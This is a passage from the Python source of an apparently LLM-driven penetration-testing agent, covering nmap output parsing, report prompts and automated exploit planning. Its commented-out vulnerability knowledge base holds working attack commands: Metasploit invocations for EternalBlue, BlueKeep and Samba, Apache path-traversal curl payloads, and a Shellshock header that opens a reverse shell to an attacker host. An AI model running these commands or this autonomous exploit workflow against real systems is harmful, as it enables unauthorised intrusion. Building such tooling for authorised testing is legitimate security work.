            if m_port:
                current_port = int(m_port.group(1))
                continue

            if current_port is None:
                continue

            meta = nse_meta.setdefault(current_port, {
                "http_title": None,
                "server_header": None,
                "is_http": False,
                "nse_lines": [],
            })

            m_title = _nse_title_re.match(stripped)
            if m_title:
                title = m_title.group(1).strip()
                if title.lower() not in ("", "site doesn't have a title"):
                    meta["http_title"] = title
                meta["is_http"] = True
                continue

            m_server = _nse_server_re.match(stripped)
            if m_server:
                meta["server_header"] = m_server.group(1).strip()
                meta["is_http"] = True
                continue

            m_nse = _nse_line_re.match(stripped)
            if m_nse:
                meta["nse_lines"].append(m_nse.group(1).strip())

        # ── Service upgrade from NSE when port-table service is generic ──
        _GENERIC_PROTOCOLS = {
            "http", "https", "ssl/http", "http-proxy", "unknown",
            "tcpwrapped", "",
        }

        for port, meta in nse_meta.items():
            port_str = str(port)
            current = services.get(port_str, "").strip()
            current_base = current.split()[0].lower() if current else ""

            if current_base not in _GENERIC_PROTOCOLS:
                continue

            # Prefer server_header (has product+version), fall back to title
            if meta["server_header"]:
                services[port_str] = meta["server_header"]
                print(f"  ✓  NSE upgrade: port {port} → {meta['server_header']}")
            elif meta["http_title"]:
                services[port_str] = meta["http_title"]
                print(f"  ✓  NSE upgrade: port {port} → {meta['http_title']}")

        return {
            "open_ports": sorted(set(open_ports)),
            "filtered_ports": sorted(set(filtered_ports) - set(open_ports)),
            "services": services,
            "nse_meta": nse_meta,
        }

    @staticmethod
    def _regex_extract_script_findings(nmap_output: str) -> list[str]:
        """
        Extract interesting findings from NSE script output.
        Captures anonymous access, SMB info, vulns, and identified web apps.
        No hardcoded app signatures — uses http-title generically.
        """
        findings = []
        current_port: int | None = None
        _port_header_re = re.compile(r"^(\d+)/(?:tcp|udp)\s+open\s+")

        for line in nmap_output.splitlines():
            line_stripped = line.strip()
            line_lower = line_stripped.lower()

            m_port = _port_header_re.match(line_stripped)
            if m_port:
                current_port = int(m_port.group(1))

            # ftp-anon
            if "anonymous ftp login" in line_lower:
                findings.append("Anonymous FTP login allowed (port 21)")
            # SMB security mode
            if "message_signing:" in line_lower:
                val = line_stripped.split(":")[-1].strip() if ":" in line_stripped else ""
                findings.append(f"SMB message signing: {val}")
            if "account_used:" in line_lower and "guest" in line_lower:
                findings.append("SMB guest authentication enabled")
            # distcc
            if "distcc-cve2004-2687" in line_lower or ("distcc" in line_lower and "result:" in line_lower):
                findings.append(f"distcc RCE (CVE-2004-2687) detected: {line_stripped.strip('|_ ')}")
            # vsftpd backdoor
            if "ftp-vsftpd-backdoor" in line_lower and "vulnerable" in line_lower:
                findings.append("vsftpd 2.3.4 backdoor (CVE-2011-2523) CONFIRMED VULNERABLE")
            elif "backdoor" in line_lower and "ftp" in line_lower:
                findings.append(f"FTP backdoor detection: {line_stripped.strip('|_ ')}")
            # SMB OS discovery
            if "samba" in line_lower and re.search(r"\d+\.\d+\.\d+", line_stripped):
                findings.append(f"SMB version detail: {line_stripped.strip('|_ ')}")

            # http-shellshock: the CVE ID appears somewhere in the NSE section output
            # regardless of which specific line it's on — match any line containing
            # CVE-2014-6271 or CVE-2014-7169 (the Shellshock family).
            if "cve-2014-6271" in line_lower or "cve-2014-7169" in line_lower:
                findings.append(f"shellshock CVE-2014-6271 detected on port {current_port}")

            # Report any http-title as a finding (generic — no signature matching)
            m_title = re.match(r"^\|\s*http-title:\s*(.+)", line_stripped, re.I)
            if m_title and current_port:
                title_text = m_title.group(1).strip()
                if title_text.lower() not in ("", "site doesn't have a title"):
                    findings.append(
                        f"Web application identified on port {current_port}: "
                        f"{title_text} (from http-title)"
                    )

            # http-enum CGI script paths — needed so Shellshock module gets TARGETURI.
            # Matches lines like: /cgi-bin/user.sh: Shell file
            m_cgi = re.match(
                r"^\|[_\s]*((?:/cgi[-_]?bin)?/[^\s:]+\.(?:sh|cgi|pl|py|rb))\s*:",
                line_stripped, re.I,
            )
            if m_cgi and current_port:
                cgi_path = m_cgi.group(1).strip()
                findings.append(f"CGI script found on port {current_port}: {cgi_path}")

        return findings

    @staticmethod
    def _extract_samba_exact_version(nmap_output: str) -> str:
        """
        HIGH-003 FIX: Extract exact Samba version from smb-os-discovery output.
        """
        for line in nmap_output.splitlines():
            m = re.search(r"[Ss]amba\s+(\d+\.\d+\.\d+[\w\-\.]*)", line)
            if m:
                return m.group(1)
        return ""

    def analyze_output(self, nmap_output: str, step_label: str, step_port: int | None = None) -> dict:
        """
        Regex (deterministic) + LLM (insights). Regex is AUTHORITATIVE for ports.

        CRIT-001 FIX: LLM CANNOT add ports that regex didn't find.
        CRIT-002 FIX: Port-service coherence validation.
        CRIT-003 FIX: Regex versions always override LLM versions.
        CRIT-005 FIX: Script findings extracted by regex.
        HIGH-003 FIX: Exact Samba version extraction.
        FIX-NSE:      Services enriched from NSE output before LLM sees them.
        """
        regex_data = self._regex_extract_ports(nmap_output)
        script_findings = self._regex_extract_script_findings(nmap_output)
        samba_version = self._extract_samba_exact_version(nmap_output)

        user_msg = f"""\
Step: {step_label}
Output:
{nmap_output[:3000]}

Extract as JSON. FULL version strings in services. ALL open ports. firewall must be {{}}, never null.
Keys: port number only ("22" not "22/tcp").
IMPORTANT: Only include ports that appear as "X/tcp open" in the output. Do NOT use line numbers as port numbers."""

        findings = self._parse_json(self._call_llm(ANALYZER_SYSTEM, user_msg)) or {}

        # Normalize (None-safe)
        findings["services"] = {str(self._clean_port(k) or k): self._safe_str(v)
                                for k, v in self._safe_dict(findings.get("services")).items()}
        findings["open_ports"] = [p for p in (self._clean_port(x) for x in
                                  self._safe_list(findings.get("open_ports"))) if p is not None]
        findings["filtered_ports"] = [p for p in (self._clean_port(x) for x in
                                      self._safe_list(findings.get("filtered_ports"))) if p is not None]

        # ─────────────────────────────────────────────────────────────
        # CRIT-001 FIX: Regex is AUTHORITATIVE for ports.
        # ─────────────────────────────────────────────────────────────
        regex_ports = set(regex_data["open_ports"])

        if regex_ports:
            llm_only_ports = set(findings["open_ports"]) - regex_ports
            if llm_only_ports:
                print(f"  ⚠  REJECTED LLM-only ports (not in nmap output): {sorted(llm_only_ports)}")
            findings["open_ports"] = sorted(regex_ports)
        else:
            if findings["open_ports"]:
                print(f"  ⚠  REJECTED all LLM ports (regex found none): {sorted(findings['open_ports'])}")
            findings["open_ports"] = []

        # ─────────────────────────────────────────────────────────────
        # CRIT-003 FIX: Regex services are AUTHORITATIVE.
        # FIX-NSE: regex_data now includes NSE-enriched services.
        # ─────────────────────────────────────────────────────────────
        validated_services = {}
        for ps, rsvc in regex_data["services"].items():
            validated_services[ps] = rsvc

        # Only add LLM services for ports that regex confirmed as open
        for ps, lsvc in findings["services"].items():
            port_int = self._clean_port(ps)
            if port_int is not None and port_int not in regex_ports:
                continue
            if ps not in validated_services or not validated_services[ps] or \
               validated_services[ps].lower() in ("unknown", ""):
                if port_int is not None and _validate_port_service(port_int, lsvc):
                    validated_services[ps] = lsvc
                elif port_int is not None:
                    print(f"  ⚠  REJECTED incoherent service '{lsvc}' on port {port_int}")

        findings["services"] = validated_services

        # HIGH-003 FIX: If we found an exact Samba version, update SMB services
        if samba_version:
            for ps in list(findings["services"].keys()):
                port_int = self._clean_port(ps)
                if port_int in (139, 445):
                    current = findings["services"][ps]
                    if "samba" in current.lower() and ("3.X" in current or "4.X" in current):
                        updated = current.replace("3.X - 4.X", samba_version)
                        findings["services"][ps] = updated
                        print(f"  ✓  Updated Samba version on port {port_int}: {samba_version}")

        # Remove services for ports that aren't open
        open_set = set(findings["open_ports"])
        findings["services"] = {
            ps: svc for ps, svc in findings["services"].items()
            if self._clean_port(ps) in open_set
        }

        findings["filtered_ports"] = sorted(
            (set(findings["filtered_ports"]) | set(regex_data["filtered_ports"])) - open_set)

        findings["os_hint"] = self._safe_str(findings.get("os_hint")) or "unknown"
        findings["firewall"] = self._safe_dict(findings.get("firewall"))
        # Normalize nmap_cves: LLM sometimes returns plain strings instead of dicts.
        # Use step_port when available so the CVE keeps its scan port instead of "?".
        raw_cves = self._safe_list(findings.get("nmap_cves"))
        _str_port = str(step_port) if step_port else "?"
        findings["nmap_cves"] = [
            {"cve_id": c, "score": None, "url": "", "port": _str_port} if isinstance(c, str) else c
            for c in raw_cves
            if isinstance(c, (str, dict))
        ]

        # CRIT-005 FIX: Merge regex-extracted script findings with LLM findings
        llm_findings = self._safe_list(findings.get("interesting_findings"))
        all_findings = list(llm_findings)
        for sf in script_findings:
            if sf not in all_findings:
                all_findings.append(sf)
        findings["interesting_findings"] = all_findings

        findings["suggested_followups"] = self._safe_list(findings.get("suggested_followups"))
        findings["nse_meta"] = regex_data.get("nse_meta", {})
        findings["step_label"] = step_label

        self.accumulated_findings.append(findings)
        return findings

    # ── Step insight interpretation ───────────────────────────────

    def interpret_findings(self, step_label: str, new_findings: dict,
                           prior_services: dict) -> str:
        """
        Ask the LLM to interpret whether the new NSE results add anything
        meaningful beyond what was already known. Returns a short natural-language
        insight (2-4 sentences) or a brief 'nothing new' note.

        Called after analyze_output() so new_findings is already validated.
        prior_services is captured before this step so we can diff what changed.
        """
        interesting = self._safe_list(new_findings.get("interesting_findings"))
        new_services = self._safe_dict(new_findings.get("services"))

        # Diff services — which ports got a richer version string?
        upgraded: list[str] = []
        for port, svc in new_services.items():
            prior = prior_services.get(port, "")
            svc_clean = (svc or "").strip()
            prior_clean = (prior or "").strip()
            if svc_clean and svc_clean.lower() not in ("unknown", "") \
                    and svc_clean != prior_clean:
                upgraded.append(
                    f"port {port}: '{prior_clean or '(unknown)'}' → '{svc_clean}'"
                )

        # Nothing meaningfully new — skip the LLM call
        if not interesting and not upgraded:
            return "No new information beyond what was already known."

        context_parts: list[str] = []
        if upgraded:
            context_parts.append("Service / version updates:\n  " +
                                  "\n  ".join(upgraded))
        if interesting:
            context_parts.append("Findings from script output:\n  " +
                                  "\n  ".join(str(f) for f in interesting[:12]))

        prior_summary = json.dumps(
            {p: s for p, s in list(prior_services.items())[:10]},
            ensure_ascii=False,
        )

        user_msg = (
            f"Step just completed: {step_label}\n\n"
            + "\n\n".join(context_parts)
            + f"\n\nPreviously known services: {prior_summary}\n\n"
            "In 2-4 sentences, what does this add to the picture of the target? "
            "Is anything exploitable or unexpected? What to prioritise next?"
        )

        return self._call_llm(INSIGHT_SYSTEM, user_msg, max_tokens=220)

    # ── Final report ──────────────────────────────────────────────

    def final_report(self, target_ip: str) -> str:
        if not self.accumulated_findings: return "No findings."
        c = self._consolidated_findings()

        ports_str = ", ".join(f"TCP {p} ({c['services'].get(str(p), 'unknown')})"
                              for p in c["open_ports"]) or "None"
        filtered_str = ", ".join(str(p) for p in c.get("filtered_ports", [])) or "None"
        os_line = self._safe_str(c.get("os_hint"))
        if not os_line or os_line.lower() in ("unknown", ""): os_line = "Not determined"
        fw = self._safe_dict(c.get("firewall"))

        script_summary = [f"  Port {p}: {', '.join(sorted(s))}" for p, s in sorted(self._scripted.items())]

        # Generate deterministic risk context from the knowledge base
        det_recs = self.generate_deterministic_recommendations()
        risk_indicators = [
            f"{r['severity']}: {r['title']} ({r['cve']}) — Metasploit: {r['metasploit']}"
            for r in det_recs if r.get("metasploit")
        ]
        # Add findings-based indicators
        risk_indicators.extend(self._findings_based_indicators(c))

        risk_context = ""
        if risk_indicators:
            risk_context = "\nKNOWN RISK INDICATORS:\n" + "\n".join(f"  - {r}" for r in risk_indicators)

        report_prompt = f"""\
VERIFIED DATA ONLY.

TARGET: {target_ip}
OPEN PORTS: {ports_str}
FILTERED: {filtered_str}
OS: {os_line}
FIREWALL: detected={fw.get('detected')} type={fw.get('type')} bypass={fw.get('bypass_possible')}
SCRIPTS:
{chr(10).join(script_summary) if script_summary else "  None"}
FINDINGS: {json.dumps(c['interesting_findings'], ensure_ascii=False)}
{risk_context}
STEPS: {self._total_steps}

DO NOT mention ports not in OPEN PORTS. If data missing → "Not determined".
Attack surface must reflect the risk indicators above. If any CRITICAL risk exists, surface is HIGH or CRITICAL.

4 sections:
## Attack Surface Summary
## Detected Services and Versions
## Key Findings
## Recommended Next Steps (include specific CVE IDs, Metasploit modules, and commands)"""
        return self._call_llm(REPORT_SYSTEM, report_prompt, max_tokens=1536)

    @staticmethod
    def _findings_based_indicators(consolidated: dict) -> list[str]:
        """Generate risk indicators from scan findings (anonymous access, misconfigs, etc.)."""
        indicators = []
        findings_lower = " ".join(str(f).lower() for f in consolidated.get("interesting_findings", []))

        _FINDING_RULES = [
            ("anonymous" in findings_lower and "ftp" in findings_lower,
             "MEDIUM: Anonymous FTP access — unauthenticated file enumeration"),
            ("anonymous" in findings_lower and "smb" in findings_lower,
             "MEDIUM: Anonymous SMB access — unauthenticated share enumeration"),
            ("guest" in findings_lower,
             "MEDIUM: Guest authentication enabled — unauthenticated access to shares"),
            ("signing" in findings_lower and "disabled" in findings_lower,
             "MEDIUM: SMB message signing disabled — vulnerable to relay attacks"),
            ("no password" in findings_lower or "empty password" in findings_lower,
             "HIGH: Service accessible without password"),
            ("default credentials" in findings_lower or "default password" in findings_lower,
             "HIGH: Default credentials detected"),
            ("directory listing" in findings_lower,
             "LOW: Directory listing enabled — information disclosure"),
            ("phpinfo" in findings_lower,
             "MEDIUM: phpinfo() exposed — leaks server configuration"),
            ("wp-login" in findings_lower or "wordpress" in findings_lower,
             "MEDIUM: WordPress detected — enumerate users and plugins"),
        ]
        for condition, indicator in _FINDING_RULES:
            if condition:
                indicators.append(indicator)
        return indicators

    def generate_deterministic_recommendations(self) -> list[dict]:
        """
        Scan all detected services against a generalized knowledge base.
        Returns structured recommendations guaranteed to be correct.
        Works for ANY target — not specific to any HTB machine.

        KB DISABLED — returning empty so the model derives everything from
        NVD + MSF RAG without hardcoded vulnerability knowledge.
        Re-enable by removing the early return below.
        """
        return []
        # ── original body below — unreachable while KB is disabled ───────────
        c = self._consolidated_findings()
        services = c.get("services", {})
        os_hint = c.get("os_hint", "").lower()
        findings_lower = " ".join(str(f).lower() for f in c.get("interesting_findings", []))

        # Determine target OS from os_hint AND from service strings.
        # Samba in any service string is a reliable Linux/Unix indicator —
        # it prevents Windows-only exploits (EternalBlue, MS08-067) from
        # being planned against Linux Samba targets.
        all_services_lower = " ".join(v.lower() for v in services.values())
        has_samba = "samba" in all_services_lower
        is_linux = has_samba or any(
            kw in os_hint for kw in ("linux", "unix", "debian", "ubuntu", "centos", "fedora")
        )
        # microsoft-ds / netbios-ssn / msrpc are Windows-exclusive service names —
        # they are reliable Windows indicators even when OS detection produced nothing.
        _WIN_SVC_NAMES = {"microsoft-ds", "msrpc", "netbios-ssn", "netbios-ns", "ms-wbt-server"}
        svc_first_words = {v.lower().split()[0] for v in services.values() if v.strip()}
        has_windows_services = bool(svc_first_words & _WIN_SVC_NAMES)
        is_windows = (not has_samba) and (
            has_windows_services or any(kw in os_hint for kw in ("windows", "win "))
        )

        recommendations = []
        seen_cves = set()

        def _os_ok(rule) -> bool:
            rule_os = rule.get("target_os", "any")
            if rule_os == "windows" and is_linux:
                return False
            if rule_os == "linux" and is_windows:
                return False
            return True

        # Pass 1: match rules against service version strings
        for port_str, svc_string in services.items():
            svc_lower = svc_string.lower()
            for rule in _KNOWN_VULNS:
                if not re.search(rule["service_re"], svc_lower):
                    continue
                if not _os_ok(rule):
                    continue
                if rule["cve"] not in seen_cves:
                    seen_cves.add(rule["cve"])
                    rec = dict(rule)
                    # Respect an explicit port in the rule (e.g., usermap_script
                    # requires 139 regardless of which port samba was detected on).
                    # Fall back to the discovered port only when the rule has no opinion.
                    if "port" not in rule:
                        rec["port"] = port_str
                    rec["detected_service"] = svc_string
                    recommendations.append(rec)

        # Pass 2: match rules against individual interesting_findings.
        # This handles cases where vulnerability detection comes from NSE scripts
        # (e.g., Shellshock detected by http-shellshock) rather than the version
        # string, so service_re contains a CVE ID or vuln name instead of a version.
        for finding_str in c.get("interesting_findings", []):
            finding_lower = str(finding_str).lower()
            for rule in _KNOWN_VULNS:
                if rule["cve"] in seen_cves:
                    continue
                if not re.search(rule["service_re"], finding_lower):
                    continue
                if not _os_ok(rule):
                    continue
                # Extract port from finding string if present ("...on port 80")
                port_m = re.search(r"port\s+(\d+)", finding_lower)
                finding_port = port_m.group(1) if port_m else "?"
                seen_cves.add(rule["cve"])
                rec = dict(rule)
                if "port" not in rule:
                    rec["port"] = finding_port
                rec["detected_service"] = finding_str
                recommendations.append(rec)

        _sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
        recommendations.sort(key=lambda r: _sev_order.get(r["severity"], 9))

        # usermap_script requires port 139 (NetBIOS): the module hardwires SMB1
        # via the Rex client (deregisters SMB::ProtocolVersion, connect(versions:[1]))
        # and the username map script codepath in Samba 3.0.x is reliably triggered
        # only through the NetBIOS session setup on 139.  Do NOT redirect it to 445.

        return recommendations

    def plan_exploitation(self, target_ip: str, context: dict) -> list[dict]:
        """
        LLM-driven structured exploit identification based on all gathered evidence.

        The LLM identifies WHICH vulnerabilities are exploitable (CVE + service +
        port).  It deliberately does NOT name a specific module path — the MSF
        planner's RAG+LLM path selects the module by reading documentation, which
        ensures it picks the OS-version–compatible variant (ms17_010_psexec for
        XP/2003, ms17_010_eternalblue for Vista+, usermap_script for Samba 3.x…).

        Returns det_rec-compatible dicts: {cve, severity, title, port, detected_service}
        """
        os_family  = context.get("os_family", "unknown")
        arch       = context.get("arch",       "unknown")
        os_raw     = context.get("os", self._consolidated_findings().get("os_hint", "unknown"))

        svc_lines = [
            f"  Port {s.get('port','?')}: {s.get('service','?')} {s.get('version','')}".rstrip()
            for s in (context.get("services") or [])
        ]
        nvd_lines = [
            f"  {cve.get('cve_id','?')} CVSS {cve.get('score','?')} [port {entry.get('port','?')}]"
            for entry in (context.get("nvd_cves") or [])
            for cve in (entry.get("cves") or [])
        ]
        ssp_lines = [
            f"  [{label}] EDB-{e.get('EDB-ID','?')}: "
            f"{(e.get('Title','') or '')[:65]}  [{e.get('Type','')}]"
            for label, entries in sorted((context.get("searchsploit") or {}).items())
            for e in (entries or [])[:3]
        ]
        findings = [
            str(f) for f in self._consolidated_findings().get("interesting_findings", []) if f
        ]

        user_msg = f"""\
TARGET: {target_ip}
OS: {os_raw}  (family: {os_family}, arch: {arch})

SERVICES:
{chr(10).join(svc_lines) or "  None detected"}

NSE FINDINGS:
{json.dumps(findings[:20], ensure_ascii=False)}

NVD CVEs:
{chr(10).join(nvd_lines) or "  None found by NVD"}

SEARCHSPLOIT MATCHES:
{chr(10).join(ssp_lines) or "  None found"}

ANALYST SUMMARY:
{(context.get('report_summary') or '')[:1500]}

Produce the JSON exploit plan."""

        raw = self._call_llm(EXPLOIT_PLANNER_SYSTEM, user_msg, max_tokens=1024)

        # Extract a JSON array from LLM output — may be wrapped in prose or fences
        raw_clean = re.sub(r"```(?:json)?\s*", "", raw).replace("```", "").strip()
        parsed: list | None = None
        try:
            parsed = json.loads(raw_clean)
        except json.JSONDecodeError:
            pass
        if not isinstance(parsed, list):
            start, end = raw_clean.find("["), raw_clean.rfind("]")
            if start != -1 and end > start:
                try:
                    parsed = json.loads(raw_clean[start:end + 1])
                except json.JSONDecodeError:
                    pass
        if not isinstance(parsed, list):
            return []

        result = []
        for entry in parsed:
            if not isinstance(entry, dict):
                continue
            cve = str(entry.get("cve", "") or "").strip()
            # Treat "null", "none", "N/A" as no-CVE (LLM may emit these literally)
            if cve.lower() in ("null", "none", "n/a", "unknown", ""):
                cve = ""
            port_raw = entry.get("port", 0)
            try:
                port = int(port_raw or 0)
            except (TypeError, ValueError):
                port = 0
            # port is always required; CVE-ID is now optional — a condition-based
            # finding (WebDAV writable, anonymous FTP, exposed CGI…) is actionable
            # through evidence in the title/detected_service fields alone.
            if not port:
                continue
            result.append({
                "cve":              cve,
                "severity":         str(entry.get("severity",   "MEDIUM") or "MEDIUM").upper(),
                "title":            str(entry.get("title",             "") or "")[:120],
                "port":             port,
                "detected_service": str(entry.get("detected_service", "") or ""),
                # No "metasploit" key — the MSF planner's RAG+LLM path selects
                # the specific module using documentation, ensuring it picks the
                # variant compatible with the detected OS version (e.g.
                # ms17_010_psexec for XP/2003, ms17_010_eternalblue for Vista+).
            })
        return result

# ──────────────────────────────────────────────────────────────────────────────
# GENERALIZED VULNERABILITY KNOWLEDGE BASE
# Matches service strings from nmap output against known exploitable versions.
# Each entry works by regex on the service version string — no target-specific logic.
# ──────────────────────────────────────────────────────────────────────────────
# 
# _KNOWN_VULNS = [
#     # ── FTP ──────────────────────────────────────────────────────────
#     {
#         "service_re": r"vsftpd\s+2\.3\.4",
#         "severity": "CRITICAL",
#         "cve": "CVE-2011-2523",
#         "title": "vsftpd 2.3.4 Backdoor Command Execution",
#         "metasploit": "exploit/unix/ftp/vsftpd_234_backdoor",
#         "exploit_db": "17491",
#         "command": "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {target}; run'",
#         "description": "vsftpd 2.3.4 contains a backdoor that opens a root shell on port 6200/tcp when triggered by a :) smiley in the username.",
#     },
#     {
#         "service_re": r"proftpd\s+1\.3\.[0-3]",
#         "severity": "HIGH",
#         "cve": "CVE-2015-3306",
#         "title": "ProFTPD 1.3.5 mod_copy Arbitrary File Copy",
#         "metasploit": "exploit/unix/ftp/proftpd_modcopy_exec",
#         "exploit_db": "36803",
#         "command": "msfconsole -q -x 'use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS {target}; set SITEPATH /var/www; run'",
#         "description": "ProFTPD mod_copy allows unauthenticated file copy, enabling code execution via web shell upload.",
#     },
#     # ── SMB / Samba ──────────────────────────────────────────────────
#     {
#         # Matches both exact "3.0.20" and nmap's imprecise "3.X - 4.X" detection.
#         # When nmap can't determine the exact version it reports "Samba smbd 3.X - 4.X"
#         # (lowercased: "samba smbd 3.x - 4.x"). Both patterns are matched here so
#         # that CVE-2007-2447 is always flagged when any Samba 3.x is detected.
#         "service_re": r"samba.*(3\.0\.\d|3\.[x0-4])",
#         "severity": "CRITICAL",
#         "cve": "CVE-2007-2447",
#         "title": "Samba 3.0.x username map script RCE",
#         "metasploit": "exploit/multi/samba/usermap_script",
#         "exploit_db": "16320",
#         "target_os": "linux",
#         # usermap_script hardwires SMB1 (connect(versions:[1])) — always port 139.
#         # Port 445 uses SMB2/3 and the module will fail even if Samba is listening.
#         "port": 139,
#         "command": "msfconsole -q -x 'use exploit/multi/samba/usermap_script; set RHOSTS {target}; run'",
#         "description": "Samba 3.0.20 through 3.0.25rc3 allows remote command execution via shell metacharacters in the username parameter.",
#     },
#     {
#         "service_re": r"samba.*(?:3\.[5-9]|3\.\d{2}|4\.[0-6])\.\d",
#         "severity": "HIGH",
#         "cve": "CVE-2017-7494",
#         "title": "Samba SambaCry / EternalRed RCE",
#         "metasploit": "exploit/linux/samba/is_known_pipename",
#         "exploit_db": "42084",
#         "target_os": "linux",
#         "command": "msfconsole -q -x 'use exploit/linux/samba/is_known_pipename; set RHOSTS {target}; run'",
#         "description": "Samba 3.5.0 - 4.6.4 allows remote code execution by uploading a shared library to a writable share.",
#     },
#     {
#         # EternalBlue: Windows-ONLY. The Linux guard is is_windows/is_linux above —
#         # matching microsoft-ds alone is safe because has_samba protects Linux Samba.
#         # Port is pinned to 445: the regex may fire on netbios-ssn (139) first because
#         # ports are iterated in sorted order, but SMB exploits always need port 445.
#         "service_re": r"microsoft-ds|netbios-ssn|(?:smb|netbios).*windows|windows.*(?:smb|microsoft)",
#         "severity": "CRITICAL",
#         "cve": "CVE-2017-0143",
#         "port": 445,
#         "title": "MS17-010 EternalBlue SMB RCE",
#         "metasploit": "exploit/windows/smb/ms17_010_eternalblue",
#         "exploit_db": "42315",
#         "target_os": "windows",
#         "command": "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; run'",
#         "description": "Microsoft SMBv1 allows remote code execution. Affects Windows Vista through Windows 10 / Server 2016.",
#     },
#     {
#         # ms08_067_netapi only affects Windows 2000 / XP / Server 2003.
#         # Do NOT match bare "microsoft-ds" or "netbios-ssn" — those are also
#         # present on Windows 7/2008/10 where this exploit does not work.
#         "service_re": r"(?:microsoft-ds|netbios-ssn|smb|netbios).*(?:xp|2000|2003)|windows.*(?:xp|2000|2003)|(?:xp|2000|2003).*(?:smb|microsoft)",
#         "severity": "CRITICAL",
#         "cve": "CVE-2008-4250",
#         "port": 445,
#         "title": "MS08-067 Windows Server Service RCE",
#         "metasploit": "exploit/windows/smb/ms08_067_netapi",
#         "exploit_db": "40279",
#         "target_os": "windows",
#         "command": "msfconsole -q -x 'use exploit/windows/smb/ms08_067_netapi; set RHOSTS {target}; run'",
#         "description": "Windows Server Service vulnerability allows remote code execution without authentication.",
#     },
#     # ── SSH ───────────────────────────────────────────────────────────
#     {
#         "service_re": r"openssh\s+[1-6]\.\d|openssh\s+7\.[0-6]",
#         "severity": "MEDIUM",
#         "cve": "CVE-2018-15473",
#         "title": "OpenSSH < 7.7 Username Enumeration",
#         "metasploit": "auxiliary/scanner/ssh/ssh_enumusers",
#         "exploit_db": "45233",
#         "command": "msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS {target}; set USER_FILE /usr/share/wordlists/usernames.txt; run'",
#         "description": "OpenSSH before 7.7 allows username enumeration via timing differences in authentication responses.",
#     },
#     # ── HTTP / Web ───────────────────────────────────────────────────
#     {
#         "service_re": r"apache.*(2\.4\.49|2\.4\.50)\b",
#         "severity": "CRITICAL",
#         "cve": "CVE-2021-41773",
#         "title": "Apache 2.4.49/2.4.50 Path Traversal + RCE",
#         "metasploit": "exploit/multi/http/apache_normalize_path_rce",
#         "exploit_db": "50383",
#         "command": "curl -s --path-as-is 'http://{target}/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' -d 'echo; id'",
#         "description": "Apache 2.4.49 path traversal allows reading arbitrary files; with mod_cgi enabled, allows RCE.",
#     },
#     {
#         # CVE-2021-42013 ONLY affects 2.4.50 (bypass of the 2.4.49 fix).
#         # Do NOT match other versions — Apache 2.4.18 etc. are NOT affected.
#         "service_re": r"apache.*2\.4\.50\b",
#         "severity": "HIGH",
#         "cve": "CVE-2021-42013",
#         "title": "Apache 2.4.50 Path Traversal RCE",
#         "metasploit": "exploit/multi/http/apache_normalize_path_rce",
#         "exploit_db": "50406",
#         "command": "curl -s --path-as-is 'http://{target}/icons/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd'",
#         "description": "Extended path traversal bypass of the CVE-2021-41773 fix.",
#     },
#     # ── Shellshock ───────────────────────────────────────────────────
#     {
#         # Triggered by the http-shellshock NSE script or by Apache + CGI on older Ubuntu.
#         # The service_re matches the interesting_findings string injected by
#         # _regex_extract_script_findings when the nmap script fires.
#         "service_re": r"shellshock|cve-2014-6271",
#         "severity": "CRITICAL",
#         "cve": "CVE-2014-6271",
#         "title": "Shellshock Bash CGI RCE",
#         "metasploit": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
#         "exploit_db": "34765",
#         "target_os": "linux",
#         "command": "curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/{lhost}/4444 0>&1' http://{target}/cgi-bin/user.sh",
#         "description": "Bash Shellshock allows remote code execution via HTTP headers when mod_cgi is enabled.",
#     },
#     {
#         "service_re": r"tomcat.*(4\.\d|5\.\d|6\.0|7\.0|8\.0|8\.5|9\.0)",
#         "severity": "HIGH",
#         "cve": "CVE-2017-12617",
#         "title": "Apache Tomcat PUT Method JSP Upload RCE",
#         "metasploit": "exploit/multi/http/tomcat_jsp_upload_bypass",
#         "exploit_db": "42966",
#         "command": "msfconsole -q -x 'use exploit/multi/http/tomcat_jsp_upload_bypass; set RHOSTS {target}; run'",
#         "description": "Apache Tomcat allows RCE via JSP upload when PUT method is enabled (readonly=false).",
#     },
#     {
#         "service_re": r"werkzeug|flask",
#         "severity": "MEDIUM",
#         "cve": "CVE-2023-25136",
#         "title": "Werkzeug Debug Console (if exposed)",
#         "metasploit": "",
#         "exploit_db": "",
#         "command": "curl http://{target}/console",
#         "description": "Werkzeug debugger console, if exposed, allows arbitrary Python code execution. Check /console endpoint.",
#     },
#     {
#         "service_re": r"jenkins",
#         "severity": "HIGH",
#         "cve": "CVE-2024-23897",
#         "title": "Jenkins Arbitrary File Read / RCE",
#         "metasploit": "",
#         "exploit_db": "",
#         "command": "java -jar jenkins-cli.jar -s http://{target}:8080/ who-am-i @/etc/passwd",
#         "description": "Jenkins CLI allows arbitrary file read; with specific plugins, can lead to RCE.",
#     },
#     # ── distcc ────────────────────────────────────────────────────────
#     {
#         "service_re": r"distcc",
#         "severity": "HIGH",
#         "cve": "CVE-2004-2687",
#         "title": "distccd Unauthenticated Remote Code Execution",
#         "metasploit": "exploit/unix/misc/distcc_exec",
#         "exploit_db": "9915",
#         "command": "msfconsole -q -x 'use exploit/unix/misc/distcc_exec; set RHOSTS {target}; run'",
#         "description": "distccd allows execution of arbitrary commands by any connecting client without authentication.",
#     },
#     # ── RDP ────────────────────────────────────────────────────────────
#     {
#         "service_re": r"ms-wbt-server|rdp.*windows.*(7|2008|vista|xp)",
#         "severity": "CRITICAL",
#         "cve": "CVE-2019-0708",
#         "title": "BlueKeep RDP Pre-Auth RCE",
#         "metasploit": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
#         "exploit_db": "46946",
#         "command": "msfconsole -q -x 'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS {target}; run'",
#         "description": "Windows RDP pre-authentication RCE. Affects Windows XP through Windows Server 2008 R2.",
#     },
#     # ── Database ──────────────────────────────────────────────────────
#     {
#         "service_re": r"mysql\s+5\.[0-5]",
#         "severity": "HIGH",
#         "cve": "CVE-2012-2122",
#         "title": "MySQL 5.x Authentication Bypass",
